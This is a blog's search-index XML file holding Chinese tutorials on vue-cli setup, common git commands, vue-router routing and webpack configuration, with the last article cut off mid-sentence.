<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[vue-cli 脚手架搭建生产环境]]></title>
    <url>%2F2019%2F03%2F12%2Fvue-cli%20%E8%84%9A%E6%89%8B%E6%9E%B6%E6%90%AD%E5%BB%BA%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[1. 前言：在 node 环境中操作。请先安装好 node 环境vue-cli 这个构建工具大大降低了webpack的使用难度，支持热更新，有 webpack-dev-server 的支持，相当于启动了一个请求服务器，给你搭建了一个测试环境，只关注开发就OK。2. 使用 vue-cli 搭建一个开发环境的 vue项目（大致为以下五个小结）1. 全局安装 webpack webpack-cli注：webpack 4.X 开始，需要安装 webpack-cli 依赖 ,所以使用这条命令123cnpm install webpack webpack-cli -gwebpack -V //检测是否安装成功2. 全局安装 vue-cli1cnpm install --global vue-cli3.用 vue-cli 构建项目首先在D盘新建一个文件夹 vue-dev 作为项目存放地，然后使用命令行cd进入到项目目录输入命令初始化项目1vue init webpack vue-demovue-demo 是自定义的项目名称，命令执行之后，会在当前目录生成一个以该名称命名的项目文件夹。解释下：回答完毕后上图就开始构建项目了。配置完成后，可以看到目录下多出了一个项目文件夹 vue-demo，然后cd进入这个文件夹：安装依赖1cnpm installnpm install ：安装所有的模块，如果是安装具体的哪个个模块，在install 后面输入模块的名字即可。而只输入install就会按照项目的根目录下的package.json文件中依赖的模块安装（这个文件里面是不允许有任何注释的），每个使用npm管理的项目都有这个文件，是npm操作的入口文件。因为是初始项目，还没有任何模块，所以我用npm install 安装所有的模块。安装完成后，目录中会多出来一个node_modules文件夹，这里放的就是所有依赖的模块。安装完成实验 npm run dev 启动项目现在文件目录结构如下：4. 目录结构仔细看一下这张图：解释下每个文件夹代表的意思5. 把项目部署到生产环境，打包上线注意，自己的项目文件都需要放到 src 文件夹下。在项目开发完成之后，可以输入 npm run build 来进行打包工作。1npm run build打包完成后，会生成 dist 文件夹，里面会生成 index.html 和 static文件夹，如果已经修改了文件路径，可以直接打开本地文件查看。项目上线时，只需要将 dist 文件夹里面的文件放到服务器根目录就行了。这里我们使用 phpStudy 打开的 Apache 服务器，把文件丢到 phpStudy 设置的 WWW 文件跟目录下。因为设置默认是找 index.html 结尾的文件，所以会直接运行 index.html 。]]></content>
      <categories>
        <category>vue-cli</category>
      </categories>
      <tags>
        <tag>vue-cli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git使用总结]]></title>
    <url>%2F2019%2F03%2F10%2Fgit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[下面是我整理的常用 Git 命令清单。几个专用名词的译名如下。Workspace：工作区Index / Stage：暂存区Repository：仓库区（或本地仓库）Remote：远程仓库更多参考地址：https://www.cnblogs.com/chenwolong/p/GIT.html1. 把本地电脑和github服务器账号相关联使用 HTTPS 是需要输入用户名和密码的方式 每次都要输入 输错就把提交命令再执行一次 会重新让你输入使用 SSH 可以让本地电脑和github账号相关联 关联了之后就是永久理解原理： 使用一个本地秘钥(电脑的身份证) 把你的本地秘钥和服务器github账号相互绑定 把身份证绑定到服务器账号上，你每次提交都会读取你当前的本地的秘钥 再和你本地仓库管理的github服务器仓库的账号里面的秘钥对应，如果是一样的就认为github是认可这台电脑的就允许提交在本地电脑生成一个秘钥：在gitbash黑窗里面执行 ssh-keygen -t rsa -C &quot;70255403@qq.com&quot;输入后一路回车 出现2048就表示成功秘钥生成后会在C盘 -&gt; 用户 -&gt; 你的用户(英文或者administor) -&gt; .ssh -&gt; id_rsa.pubid_rsa.pub 本地公钥(公开的钥匙) ,把这个id_rsa.pub 使用记事本打开 把乱码复制一下打开github账号点击设置点击SSH设置点击右上角new SSHKey输入title(你的名字) key (复制公钥里面的乱码)点击Add即可出现一个黑色的钥匙就表示成功2: 常用命令2.1 设置 git 当前使用者信息git config --list 显示当前的 git 配置git config -e [--global] 编辑git 配置文件git config --global user.email &quot;邮箱&quot;git config --global user.name &quot;用户名&quot;C:\Users\Administrator -&gt; .gitconfig 查看当前git的用户名和邮箱是谁 -&gt; 可以直接修改​2.2 基础命令git clone 仓库地址 克隆文件到当前文件夹中git init 初始化仓库，在你的目录会生成 .git 文件夹git add . / 文件名/ 文件夹 （或者指定文件名或者文件名）git status 查看暂存区里面有哪些文件，可以查看哪些提交了，哪些没有提交. git commit -m &#39;描述&#39; ‘提交日志,(写上做了些什么,必填)’ 提交日志,把暂存区的文件提交到本地仓库git log 查看本地仓库所有提交的详细日志git log --oneline 查看简短的日志git reflog 查看本地仓库所有版本号git pull 把远程代码更新​3: 远程仓库和本地仓库进行关联的命令git remote add origin 远程仓库地址 指定远程仓库地址,建立连接git remote rm origin删除远程仓库地址git push -u orgin master 把本地代码提交到远程仓库主分支中 master主分支 -u指定提交到master分支git push -u origin 分支名 提交到指定的分支git push --set-upstream origin master 提交文件到远程仓库4: 远程关联错误，重新建立关联git remote 改变远程地址如果设置了一个远程仓库地址 但是不是你想要的先删除之前的远程仓库地址 git remote rm origin再添加一个新的远程仓库地址 git remote add origin 地址5: 分支git branch查看分支git branch 分支名创建分支 -&gt; 必须先提交一次文件(主支)到本地仓库,才能创建分支git checkout 分支名切换分支git merge 分支名合并分支 -&gt; 如果当前在分支zhangsan中合并主支-&gt; 把主支文件拷贝到当前分支中-&gt;重复的文件名会报错git branch -d 分支名 删除本地分支git push -u origin 分支名 提交到指定的分支6: 回滚撤销git reset --hard HEAD^ 回到上一个版本git reset --hard 版本号 回到指定的版本git diff 查看本地代码和之前仓库代码的区别 （新版本和旧版本代码的区别）git checkout -- 文件 撤销更改git reset HEAD 文件 撤销addgit checkout 撤退撤销当前代码的更改git checkout -- 指定文件.扩展名撤销单个文件修改git reset HEAD .撤退add了之后才可以撤销某个文件git checkout -- . 撤销所有修改git reset HEAD 文件名.拓展名 单独把这个文件撤销7: 一个项目从头到尾使用git步骤创建一个项目进入项目打开git bash 黑窗输入git ini 初始化一个本地仓库git add . 把本地代码添加到暂存区git commit -m &#39;提交日志第一次commit可能会报错配置用户名 git config --global user.name &quot;xiehao&quot;配置邮箱 git config --global user.email &quot;70255403@qq.com&quot;配置完成后重新执行 commit 命令 知道出现 create mode表示成功如果代码有更新 再次 git add . 再次 git commit -m ‘提交日志’创建一个远程仓库关联本地和远程仓库git remote add origin 远程仓库的地址如果关联错了 先删除后关联 git remote rm origin再 添加git remote add origin 远程仓库的地址把代码提交到远程 git push -u origin master -u表示默认值 默认提交到master分支把本地仓库代码提交到服务器里面 git push -u orgin master如果是第一次提交没有配置SSH秘钥是无法提交黑窗生成一公钥 ssh-keygen -t rsa -C “邮箱” 把邮箱改成自己的复制.ssh 里面的.pub公钥里的乱码去github绑定 -&gt; 右上角投降设置-&gt;ssh里面绑定秘钥使用push 把本地仓库代码提交到远程仓库. 如果后续本地仓库有更新,就必须从新执行下面代码git add .git commit -m ‘提交日志’git push一般大项目就会有分支 作用是项目统一 把项目同时的多个版本统一到一起 减少仓库8: 工作中开发分支的使用8.1 在侧分支上开发git initgit add .git commit -m &#39;描述&#39;git branch dev创建一个名字为 dev 的分支去 github 创建仓库git remote add origin git@github.com:xiechunhao/hm_manager.git 仓库地址（ssh）本地仓库和远程仓库创建连接git push -u origin master先提交到主分支在 github 上，创建一个分支，名字为 devgit checkout dev 切换到 dev 分支在本地添加一个文件，然后 提交 git add . git commit -m &#39;描述&#39;git push origin dev就可以提交到 dev 分支上，而不是主分支 master测试.txt 文件 只有侧分支有，主分支没有8.2 侧分支合并到主分支：git checkout master （切换到主分支）git merge dev（把某个分支合并到当前所在的分支，这里就是把 dev 分支合并到 master 分支）8.3 git clone 侧分支git clone 仓库地址 默认克隆的是主分支git clone --help 查看 clone 帮助信息git clone 仓库地址 -b dev(分支名) 克隆指定分支]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue路由使用总结]]></title>
    <url>%2F2019%2F03%2F06%2Fvue%E8%B7%AF%E7%94%B1%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[1: vue 路由起步html12345678910111213141516&lt;script src="https://unpkg.com/vue/dist/vue.js"&gt;&lt;/script&gt;&lt;script src="https://unpkg.com/vue-router/dist/vue-router.js"&gt;&lt;/script&gt;&lt;div id="app"&gt; &lt;h1&gt;Hello App!&lt;/h1&gt; &lt;p&gt; &lt;!-- 使用 router-link 组件来导航. --&gt; &lt;!-- 通过传入 `to` 属性指定链接. --&gt; &lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt; &lt;router-link to="/foo"&gt;Go to Foo&lt;/router-link&gt; &lt;router-link to="/bar"&gt;Go to Bar&lt;/router-link&gt; &lt;/p&gt; &lt;!-- 路由出口 --&gt; &lt;!-- 路由匹配到的组件将渲染在这里 --&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;javascript12345678910111213141516171819202122232425262728293031// 0. 如果使用模块化机制编程，导入Vue和VueRouter，要调用 Vue.use(VueRouter)// 1. 定义 (路由) 组件。// 可以从其他文件 import 进来const Foo = &#123; template: '&lt;div&gt;foo&lt;/div&gt;' &#125;const Bar = &#123; template: '&lt;div&gt;bar&lt;/div&gt;' &#125;// 2. 定义路由// 每个路由应该映射一个组件。 其中"component" 可以是// 通过 Vue.extend() 创建的组件构造器，// 或者，只是一个组件配置对象。// 我们晚点再讨论嵌套路由。const routes = [ &#123; path: '/foo', component: Foo &#125;, &#123; path: '/bar', component: Bar &#125;]// 3. 创建 router 实例，然后传 `routes` 配置// 你还可以传别的配置参数, 不过先这么简单着吧。const router = new VueRouter(&#123; routes // (缩写) 相当于 routes: routes&#125;)// 4. 创建和挂载根实例。// 记得要通过 router 配置参数注入路由，// 从而让整个应用都有路由功能const app = new Vue(&#123; router&#125;).$mount('#app')// 现在，应用已经启动了2: 路由的跳转方式定义路由跳转规则1&#123; path: '/login', component: login &#125;路由的跳转使用标签 router-link，会默认渲染一个 a 标签，如果需要替换成其他标签，需要定义一个 tag 属性指定。1&lt;router-link to="/login" tag="span"&gt;登录&lt;/router-link&gt;2.1: 使用router-link 跳转知道路径的跳转123&lt;ul&gt; &lt;li&gt;&lt;router-link to="/login"&gt;login页面&lt;/router-link&gt;&lt;/li&gt;&lt;/ul&gt;to 是通过绑定数据到上面123&lt;ul&gt; &lt;li&gt;&lt;router-link :to="login"&gt;login页面&lt;/router-link&gt;&lt;/li&gt;&lt;/ul&gt;12345678910&lt;script&gt;export default&#123; name:'app', data()&#123; return&#123; login:'/login' &#125; &#125;&#125;&lt;/script&gt;2.2: 使用命名路由跳转有时候，通过一个名称来标识一个路由显得更方便一些，特别是在链接一个路由，或者是执行一些跳转的时候。你可以在创建 Router 实例的时候，在 routes 配置中给某个路由设置名称。使用命名路由，配置路由规则就需要添加 name 属性，跳转方法里面的 name 就指向了配置规则的 name 属性值，如：123456789const router = new VueRouter(&#123; routes: [ &#123; path: '/user/:userId', name: 'user', component: User &#125; ]&#125;)12&lt;!--或者这种命名路由--&gt;&lt;router-link :to="&#123; name: 'user', params: &#123; userId: 123 &#125;&#125;"&gt;User&lt;/router-link&gt;12// 或者这种编程式router.push(&#123; name: 'user', params: &#123; userId: 123 &#125;&#125;)2.3: 使用编程式的跳转编程式跳转：通过 JS 代码来实现的跳转123&lt;ul&gt; &lt;li&gt;&lt;router-link to="/login" @click="goLogin(id)"&gt;login页面&lt;/router-link&gt;&lt;/li&gt;&lt;/ul&gt;使用push实现页面跳转1234567891011// 字符串this.$router.push('login')// 对象this.$router.push(&#123; path: 'login' &#125;)// 命名的路由 (path 不能 和 params 结合使用)this.$router.push(&#123; name: 'login', params: &#123; userId: '123' &#125;&#125;)// 带查询参数，变成 /register?plan=privatethis.$router.push(&#123; path: 'register', query: &#123; plan: 'private' &#125;&#125;)​使用replace实现页面的跳转跟 router.push 很像，唯一的不同就是，它不会向 history 添加新记录，而是跟它的方法名一样 —— 替换掉当前的 history 记录。12// 使用query传递参数this.$router.replace(&#123;path:'/login',query:&#123;id:123&#125;&#125;);router.go(n)这个方法的参数是一个整数，意思是在 history 记录中向前或者后退多少步，类似 window.history.go(n)。123456789101112// 在浏览器记录中前进一步，等同于 history.forward()router.go(1)// 后退一步记录，等同于 history.back()router.go(-1)// 前进 3 步记录router.go(3)// 如果 history 记录不够用，那就默默地失败呗router.go(-100)router.go(100)你也许注意到 router.push、 router.replace 和 router.go 跟 window.history.pushState、 window.history.replaceState 和 window.history.go好像， 实际上它们确实是效仿 window.historyAPI 的。3: children 定义子路由定义子路由的跳转12345&lt;ul&gt; &lt;li&gt;&lt;router-link to="/word/router1"&gt;路由1&lt;/router-link&gt;&lt;/li&gt; &lt;li&gt;&lt;router-link to="/word/router2"&gt;路由2&lt;/router-link&gt;&lt;/li&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/ul&gt;路由的跳转规则定义一个 children 数组，用来定义子跳转规则1234567891011121314&#123; path:'/word', component:Word, children:[ &#123; path:'router1', component:Router1 &#125;, &#123; path:'router2', component:Router2 &#125; ]&#125;通过 children 实现路由嵌套1234567891011121314151617181920212223242526var router = new VueRouter(&#123; routes: [ &#123; path: '/account', component: account, // 使用 children 属性，实现子路由，同时，子路由的 path 前面，不要带 / ， // 否则永远以根路径开始请求，这样不方便我们用户去理解URL地址 children: [ &#123; path: 'login', component: login &#125;, &#123; path: 'register', component: register &#125; ] &#125; ]&#125;) var account = &#123; template: '#tmpl'&#125;var login = &#123; template: '&lt;h3&gt;登录&lt;/h3&gt;'&#125;var register = &#123; template: '&lt;h3&gt;注册&lt;/h3&gt;'&#125;123456&lt;div&gt; &lt;h1&gt;这是 Account 组件&lt;/h1&gt; &lt;router-link to="/account/login"&gt;登录&lt;/router-link&gt; &lt;router-link to="/account/register"&gt;注册&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;​4: 路由之间的传参方式4.1 params 方式注：下面的 router path 地址，需要使用变量名 ： 去占位置，然后在 router-link 里面使用 / 传递参数路由跳转的时候定义要传递的参数的形式1234&#123; path:'router1/:id', component:Router1&#125;,页面跳转的时候传递的参数12&lt;!--123就是传递的id值--&gt;&lt;li&gt;&lt;router-link to="/word/router1/123"&gt;路由1&lt;/router-link&gt;&lt;/li&gt;在组件中接收传递过去的参数123456export default&#123; mounted()&#123; console.log(this.$route); console.log(this.$route.params.id); &#125;&#125;4.2 query 方式注： 如果在路由中，使用 查询字符串，给路由传递参数，则 不需要修改 路由规则的 path 属性在路由跳转地方传递query参数123&lt;li&gt; &lt;router-link v-bind:to="&#123;path:'/word/router2',query:&#123;id:123&#125;&#125;"&gt;路由2&lt;/router-link&gt;&lt;/li&gt;在组件的mounted中接收123456export default&#123; mounted()&#123; console.log(this.$route); console.log(this.$route.query.id); &#125;&#125;5: 路由重定向 redirect配置路由1234&#123; path:'/', redirect:'/login' // 重定向指向的路径&#125;重定向函数1234567&#123; path:'/', redirect:()=&gt;&#123; console.log(arguments); return '/login'; &#125;&#125;6: 路由的前进和后退页面代码12&lt;input type="button" value="前进" @click="next"/&gt;&lt;input type="button" value="后进" @click="prevent"/&gt;事件代码12345678methods:&#123; next()&#123; this.$router.go(1); &#125;, prevent()&#123; this.$router.go(-1); &#125;&#125;7: 路由实现高亮的两种方法使用默认的 router-link-active 类进行样式修改。1234567891011&lt;style&gt; .router-link-active, .myactive &#123; color: red; font-weight: 800; font-style: italic; font-size: 80px; text-decoration: underline; background-color: green; &#125;&lt;/style&gt;默认值可以通过路由的构造选项 linkActiveClass 来全局配置。12345678var routerObj = new VueRouter(&#123; routes: [ // 路由匹配规则 &#123; path: '/', redirect: '/login' &#125;, // 这里的 redirect 和 Node 中的 redirect 完全是两码事 &#123; path: '/login', component: login &#125;, &#123; path: '/register', component: register &#125; ], linkActiveClass: 'myactive'&#125;)8: 路由元信息.应用场景：如某功能（如加入购物车，查看订单，用户中心等）需要登录后才能进行下一步操作。则在路由规则里设置路由元信息的 meta 值。然后在导航守卫每次判断用户是否登录，登录则直接 next() 放过，没有登录则跳转到登录页面。具体代码如下：1234567891011121314151617const router = new VueRouter(&#123; routes: [ &#123; path: '/user', component: user, children: [ &#123; path: 'order', component: userOrder, meta: &#123; // 路由元信息 checkLogin: true // 是否需要登录 &#125; &#125; ] &#125; ]&#125;)1234567891011121314151617181920// 导航守卫router.beforeEach(async (to, from, next) =&gt; &#123; // 通过路由元信息判断 if (to.meta.checkLogin === true) &#123; // 判断是否需要登录 let res = await Vue.prototype.$http.get('site/account/islogin') if (res.data.code === 'nologin') &#123; // Vue.prototype.$message.success() Message.warning('哥们请先登录') // 去登录页 next('/login') &#125; else &#123; next() &#125; &#125; else &#123; // 必须next next() &#125;&#125;)9: 抽离路由模块定义组件 login.vue12345678910&lt;template&gt; &lt;h1&gt;登录组件&lt;/h1&gt;&lt;/template&gt;&lt;script&gt;export default &#123;&#125;&lt;/script&gt;&lt;/style&gt;配置路由文件 router.js导入 vue 和 vue-router 文件把路由 挂载到 Vue 示例上设置路由规则export default 对外暴露 Router123456789101112import Vue from 'vue'import Router from 'vue-router'import login from 'components/login.vue'Vue.use(Router)export default new Router(&#123; routes: [ &#123; path:'/login, component:login &#125; ]&#125;)App.vue 配置路由插座 &lt;router-view&gt;&lt;/router-view&gt;123456789101112131415161718&lt;template&gt; &lt;div id="app"&gt; &#123;&#123;title&#125;&#125; &lt;!--定义路由插座--&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default&#123; name:'app', data()&#123; return&#123; title:'我是项目主入口' &#125; &#125;&#125;&lt;/script&gt;路由文件注入到 main.js文件中1234567891011import Vue from 'vue';import App from './App.vue';import router from './router.js';new Vue(&#123; el: '#app', router, render(h)&#123; return h(App); &#125;&#125;)#####]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue路由</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[入门webpack,这篇就够了]]></title>
    <url>%2F2019%2F03%2F05%2F%E5%85%A5%E9%97%A8webpack%2C%E8%BF%99%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86%2F</url>
    <content type="text"><![CDATA[1: 写在前面的话阅读本文之前，先看下面这个webpack的配置文件，如果每一项你都懂，那本文能带给你的收获也许就比较有限，你可以快速浏览或直接跳过；如果你和十天前的我一样，对很多选项存在着疑惑，那花一段时间慢慢阅读本文，你的疑惑一定一个一个都会消失；如果你以前没怎么接触过Webpack，而你又你对webpack感兴趣，那么动手跟着本文中那个贯穿始终的例子写一次，写完以后你会发现你已明明白白的走进了Webpack的大门。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 一个常见的`webpack`配置文件const webpack = require('webpack');const HtmlWebpackPlugin = require('html-webpack-plugin');const ExtractTextPlugin = require('extract-text-webpack-plugin');module.exports = &#123; entry:&#123; app:'./src/main.js',//已多次提及的唯一入口文件 &#125;, // 或者 entry: __dirname + "/app/main.js", output: &#123; path: __dirname + "/build", filename: "bundle-[hash].js" &#125;, devtool: 'none', devServer: &#123; contentBase: "./public", //本地服务器所加载的页面所在的目录 historyApiFallback: true, //不跳转 inline: true, hot: true &#125;, module: &#123; rules: [&#123; test: /(\.jsx|\.js)$/, use: &#123; loader: "babel-loader" &#125;, exclude: /node_modules/ &#125;, &#123; test: /\.css$/, use: ExtractTextPlugin.extract(&#123; fallback: "style-loader", use: [&#123; loader: "css-loader", options: &#123; modules: true, localIdentName: '[name]__[local]--[hash:base64:5]' &#125; &#125;, &#123; loader: "postcss-loader" &#125;], &#125;) &#125; &#125; ] &#125;, plugins: [ new webpack.BannerPlugin('版权所有，翻版必究'), new HtmlWebpackPlugin(&#123; template: __dirname + "/app/index.tmpl.html" //new 一个这个插件的实例，并传入相关的参数 &#125;), new webpack.optimize.OccurrenceOrderPlugin(), new webpack.optimize.UglifyJsPlugin(), new ExtractTextPlugin("style.css") ]&#125;;2: webpack是什么，为什么要使用它2.1: 什么是 webpackWebPack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。其实Webpack和另外两个并没有太多的可比性，Gulp/Grunt是一种能够优化前端的开发流程的工具，而WebPack是一种模块化的解决方案，不过Webpack的优点使得Webpack在很多场景下可以替代Gulp/Grunt类的工具。Grunt和Gulp的工作方式是：在一个配置文件中，指明对某些文件进行类似编译，组合，压缩等任务的具体步骤，工具之后可以自动替你完成这些任务。Webpack的工作方式是：把你的项目当做一个整体，通过一个给定的主文件（如：index.js），Webpack将从这个文件开始找到你的项目的所有依赖文件，使用loaders处理它们，最后打包为一个（或多个）浏览器可识别的JavaScript文件。2.2: 为什么要使用它现今的很多网页其实可以看做是功能丰富的应用，它们拥有着复杂的JavaScript代码和一大堆依赖包。为了简化开发的复杂度，前端社区涌现出了很多好的实践方法。模块化，让我们可以把复杂的程序细化为小的文件;类似于TypeScript这种在JavaScript基础上拓展的开发语言：使我们能够实现目前版本的JavaScript不能直接使用的特性，并且之后还能转换为JavaScript文件使浏览器可以识别；Scss，less等CSS预处理器…这些改进确实大大的提高了我们的开发效率，但是利用它们开发的文件往往需要进行额外的处理才能让浏览器识别,而手动处理又是非常繁琐的，这就为WebPack类的工具的出现提供了需求。3: 开始使用 webpack初步了解了Webpack工作方式后，我们一步步的开始学习使用Webpack。3.1: 安装Webpack可以使用npm安装，新建一个空的练习文件夹（此处命名为 webpack-demo），在终端中转到该文件夹后执行下述指令就可以完成安装。1234//全局安装npm install -g webpack//安装到你的项目目录npm install --save-dev webpack3.2: 使用前准备在上述练习文件夹中创建一个package.json文件，这是一个标准的npm说明文件，里面蕴含了丰富的信息，包括当前项目的依赖模块，自定义的脚本任务等等。在终端中使用npm init命令可以自动创建这个package.json文件1npm init输入这个命令后，终端会问你一系列诸如项目名称，项目描述，作者等信息，不过不用担心，如果你不准备在npm中发布你的模块，这些问题的答案都不重要，回车默认即可。package.json文件已经就绪，我们在本项目中安装Webpack作为依赖包12// 安装Webpackcnpm install --save-dev webpack回到之前的空文件夹，并在里面创建两个文件夹,src文件夹和dist文件夹，src文件夹用来存放原静态资源，dist文件夹用来存放之后供浏览器读取的文件（包括使用webpack打包生成的js）。接下来我们再创建三个文件:css –放在src文件夹中;images– 放在src文件夹中;js– 放在src文件夹中;index.html–写基本的html结构main–写main入口js代码此时目录结构如下：我们在index.html文件中写入最基础的html代码，它在这里目的在于引入打包后的js文件（这里我们先把之后打包后的js文件命名为bundle.js，之后我们还会详细讲述）。1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src="../dist/bundle.js"&gt;&lt;/script&gt; &lt;ul&gt; &lt;li&gt;11*10&lt;/li&gt; &lt;li&gt;21*10&lt;/li&gt; &lt;li&gt;31*10&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;main.js文件中我们写入下述代码。1234567// 由于 ES6的代码，太高级了，浏览器解析不了，所以，这一行执行会报错import $ from 'jquery';$(function()&#123; $('li:odd').css('backgroundColor','red'); $('li:even').css('backgroundColor','yellow');&#125;);直接在页面上引用main.js会报错，因为浏览器不认识 import 这种 es6 高级的JS语法，需要使用webpack进行处理，webpack默认会把这种高级的语法转换为低级的浏览器能识别的语法；需要安装 webpack-cli。1npm install webpack webpack-cli --save-dev4: 正式使用 webpack因为上面用了 jQuery，所以我们需要安装下1cnpm install jquery --savewebpack可以在终端中使用，在基本的使用方法如下：123456// &#123;extry file&#125;出填写入口文件的路径，本文中就是上述main.js的路径，// &#123;destination for bundled file&#125;处填写打包文件的存放路径// 填写路径的时候不用添加&#123;&#125;webpack &#123;entry file&#125; &#123;destination for bundled file&#125; # 如下webpack src/js/main.js --output dist/bundle.js运行完此时可以看到 dist/bundle.js 会自动生成编译好的代码，可以看出webpack编译了main.js 现在右键打开index.html,可以看到如下结果有没有很激动，已经成功的使用Webpack打包了一个文件了。不过在终端中进行复杂的操作，其实是不太方便且容易出错的，接下来看看Webpack的另一种更常见的使用方法。5: 通过配置使用 webpack 启动项目Webpack拥有很多其它的比较高级的功能（比如说本文后面会介绍的loaders和plugins），这些功能其实都可以通过命令行模式实现，但是正如前面提到的，这样不太方便且容易出错的，更好的办法是定义一个配置文件，这个配置文件其实也是一个简单的JavaScript模块，我们可以把所有的与打包相关的信息放在里面。继续上面的例子来说明如何写这个配置文件，在当前练习文件夹的根目录下新建一个名为webpack.config.js的文件，我们在其中写入如下所示的简单配置代码，目前的配置主要涉及到的内容是入口文件路径和打包后文件的存放路径。12345678910111213// 导入处理路径的模块const path = require('path')// 导出一个配置对象，将来webpack在启动的时候，会默认来查找webpack.config.js，并读取这个文件中导出的配置对象，来进行打包处理module.exports = &#123; entry:&#123; app:'./src/main.js' &#125;, output: &#123; // 配置输出选项 path:path.resolve(__dirname, 'dist'), // 配置输出的路径 filename: 'bundle.js' // 配置输出的文件名 &#125;&#125;注：“__dirname”是node.js中的一个全局变量，它指向当前执行脚本所在的目录。有了这个配置之后，再打包文件，只需在终端里运行webpack(非全局安装需使用node_modules/.bin/webpack)命令就可以了，这条命令会自动引用webpack.config.js文件中的配置选项，示例如下：又学会了一种使用Webpack的方法，这种方法不用管那烦人的命令行参数，有没有感觉很爽。如果我们可以连webpack(非全局安装需使用node_modules/.bin/webpack)这条命令都可以不用，那种感觉会不会更爽~，继续看下文。6: 使用更快捷方式执行 webpack在命令行中输入命令需要代码类似于node_modules/.bin/webpack这样的路径其实是比较烦人的，不过值得庆幸的是npm可以引导任务执行，对npm进行配置后可以在命令行中使用简单的npm start命令来替代上面略微繁琐的命令。在package.json中对scripts对象进行相关设置即可，设置方法如下。123456&#123; "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "start": "webpack" // 修改的是这里，JSON文件不支持注释，引用时请清除 &#125;,&#125;注：package.json中的script会安装一定顺序寻找命令对应位置，本地的node_modules/.bin路径就在这个寻找清单中，所以无论是全局还是局部安装的Webpack，你都不需要写前面那指明详细的路径了。npm的start命令是一个特殊的脚本名称，其特殊性表现在，在命令行中使用npm start就可以执行其对于的命令，如果对应的此脚本名称不是start，想要在命令行中运行时，需要这样用npm run {script name}如npm run build，我们在命令行中输入npm start试试，输出结果如下：现在只需要使用npm start就可以打包文件了，有没有觉得webpack也不过如此嘛，不过不要太小瞧webpack，要充分发挥其强大的功能我们需要修改配置文件的其它选项，一项项来看。7: 使用 webpack 构建本地服务器想不想让你的浏览器监听你的代码的修改，并自动刷新显示修改后的结果，其实Webpack提供一个可选的本地开发服务器，这个本地服务器基于node.js构建，可以实现你想要的这些功能，不过它是一个单独的组件，在webpack中进行配置之前需要单独安装它作为项目依赖1npm install --save-dev webpack-dev-serverdevserver作为webpack配置选项中的一项，以下是它的一些配置选项，更多配置可参考这里devserver的配置选项功能描述contentBase默认webpack-dev-server会为根文件夹提供本地服务器，如果想为另外一个目录下的文件提供本地服务器，应该在这里设置其所在目录（本例设置到“public”目录）port设置默认监听端口，如果省略，默认为”8080“inline设置为true，当源文件改变时会自动刷新页面historyApiFallback在开发单页应用时非常有用，它依赖于HTML5 history API，如果设置为true，所有的跳转将指向index.html把这些命令加到webpack的配置文件中，现在的配置文件webpack.config.js如下所示12345devServer: &#123; contentBase: "./dist",//本地服务器所加载的页面所在的目录 hot:true, inline: true//实时刷新&#125;12345"scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "start": "webpack", "server": "webpack-dev-server --open --contentBase src" // 修改的是这里，JSON文件不支持注释，引用时请清除 &#125;,在终端中输入npm run server即可在本地的8080端口查看结果。注：需要修改 index.html 下面的 bundle.js路径为 &lt;script src=&quot;../bundle.js&quot;&gt;&lt;/script&gt;8: 管理资源注： webpack 只能识别 JS 文件，其他外部文件需要 安装对应的 loader 文件去做解析8.1: 加载 css为了在 JavaScript 模块中 import 一个 CSS 文件，你需要安装 style-loader 和 css-loader，并在 module 配置 中添加这些 loader：1npm install --save-dev style-loader css-loaderwebpack.config.js123456789module: &#123;// 用来配置第三方loader模块的 rules: [&#123;// 文件的匹配规则 test: /.css$/, use: [//处理css文件的规则 &apos;style-loader&apos;, &apos;css-loader&apos; ] &#125;]&#125;webpack 根据正则表达式，来确定应该查找哪些文件，并将其提供给指定的 loader。在这个示例中，所有以 .css 结尾的文件，都将被提供给 style-loader 和 css-loader。我们尝试一下，通过在项目中添加一个新的 index.css 文件，并将其 import 到我们的 index.js 中：1234html body &#123; background: #666; padding: 50px;&#125;main.js 导入css文件1import './css/index.css';现在运行 npm run server 命令：就可以看到 css 设置的样式8.2: 加载 less /sassless / sass 的 使用 跟 css 类似，先 npm 安装12cnpm install less-loader less -Dcnpm install sass-loader node-sass -save-dev在配置 webpack.config.js 匹配规则123456789101112module: &#123; // 用来配置第三方loader模块的 rules: [ &#123; test: /\.less$/, use: ['style-loader', 'css-loader', 'less-loader'] &#125;, //处理less文件的规则 &#123; test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] &#125;, //处理scss文件的规则 ]&#125;index.less12345html&#123; body&#123; background-color: hotpink; &#125;&#125;index.scss12345html&#123; body&#123; color: goldenrod; &#125;&#125;main.js12import './css/index.less';import './css/index.sass';运行 npm run server 命令即可看下效果8.3: 加载 images 图片先 npm 安装图片的 